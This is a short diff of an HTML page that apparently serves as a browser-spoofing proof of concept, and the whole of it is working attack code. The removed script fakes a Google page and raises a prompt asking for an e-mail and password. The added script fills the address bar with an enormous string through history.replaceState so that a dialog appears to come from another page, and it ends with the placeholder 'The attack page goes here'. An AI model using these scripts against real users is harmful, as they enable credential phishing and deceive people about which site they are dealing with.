@@ -1,1 +1,9 @@
-<script>function y(){x=open('http://www.google.com','_top'),x.document.body.innerHTML='<img/src=""onerror="setTimeout(function() {prompt(&quot;Sign into your account in order to access www.google.com&quot;, &quot;E-mail / Password&quot;)}, 150)">'};setTimeout(y, 3000); </script>
+<script>
+a="aaaaaaaaaaaaaaaa";
+for (i = 0; i < 19; i++) { 
+a += a;
+}
+history.replaceState("example", "example", a);
+alert("This alert will be shown as 'From this page', while still rendering the page the link was clicked from");
+</script>
+The attack page goes here
